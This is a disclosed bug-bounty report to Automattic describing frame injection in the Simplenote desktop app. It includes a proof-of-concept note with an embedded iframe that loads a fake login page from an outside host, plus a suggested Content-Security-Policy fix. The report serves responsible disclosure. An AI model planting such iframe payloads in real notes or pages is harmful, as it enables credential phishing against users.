# Crafted frame injection leading to form-based UI redressing.

## Report Details
- **Report ID**: 291683
- **URL**: https://hackerone.com/reports/291683
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-11-19T10:13:33.854Z
- **Disclosed**: 2017-12-31T17:04:02.871Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
# Summary

One can inject iframes into a note and create a login form that sends the user's details to a third-party server. Once again I will let the PoC do most of the explaining.

# PoC

Paste the following snippet into a Simplenote and then view it in the preview panel. I am using the latest stable build of the Simplenote app (v1.0.8) on Ubuntu 17.10.

```
Lorem Ipsum 

Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor 
incididunt ut labore et dolore magna aliqua. Mattis vulputate enim nulla 
aliquet porttitor lacus luctus accumsan tortor. Lorem dolor sed viverra ipsum 
nunc aliquet bibendum enim. Nibh cras pulvinar mattis nunc sed blandit. Nunc 
scelerisque viverra mauris in aliquam sem. Diam sit amet nisl suscipit. Felis 
imperdiet proin fermentum leo vel. Ut sem viverra aliquet eget sit amet tellus 
cras adipiscing. Enim eu turpis egestas pretium aenean pharetra magna ac. 
Faucibus nisl tincidunt eget nullam non nisi est sit amet. In eu mi bibendum 
neque egestas. Ipsum consequat nisl vel pretium lectus quam. At auctor urna 
nunc id cursus metus aliquam eleifend. Accumsan lacus vel facilisis volutpat 
est velit egestas dui. Proin nibh nisl condimentum id venenatis a. In aliquam 
sem fringilla ut morbi tincidunt augue interdum velit. Maecenas accumsan lacus 
vel facilisis volutpat est. Pharetra pharetra massa massa ultricies. Cras 
pulvinar mattis nunc sed blandit libero volutpat. Et netus et malesuada fames 
ac turpis egestas sed. 

Accumsan lacus vel facilisis volutpat est. Ipsum dolor sit amet consectetur 
adipiscing elit ut aliquam. Gravida neque convallis a cras semper auctor neque 
vitae tempus. Dui accumsan sit amet nulla facilisi. Etiam dignissim diam quis 
enim. Posuere sollicitudin aliquam ultrices sagittis orci a scelerisque <iframe 
src="https://edoverflow.com/poc/simplenote-login.html" style="margin:0;" 
frameborder=0> purus. Proin nibh nisl condimentum id venenatis a condimentum 
vitae sapien. Netus et malesuada fames ac turpis egestas sed tempus urna. Urna 
nec tincidunt praesent semper feugiat nibh. Semper risus in hendrerit gravida 
rutrum quisque non tellus orci. Dictumst quisque sagittis purus sit. Quam id 
leo in vitae turpis. Fringilla est ullamcorper eget nulla facilisi etiam 
dignissim diam quis. Tellus at urna condimentum mattis pellentesque id nibh 
tortor id. Molestie ac feugiat sed lectus vestibulum mattis.
```

{F240841}

A more convincing PoC would probably consist of playing around CSS to make the app look like it has crashed and then prompt the user to login in again.

# Mitigation

Since Simplenote is built on Electron I would imagine it should be easy to implement a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) and you should be able to set the `frame-src` directive to `none`. This can be achieved by adding the following meta element in the index.html file: 

```html
<meta http-equiv="Content-Security-Policy" content="frame-src 'none';">
```

On top of that, I would suggest looking into implementing a fully-fledged CSP to prevent similar attacks and to reduce the impact of XSS.

## Attachments
- Sign_in_to_Simplenote_001.png
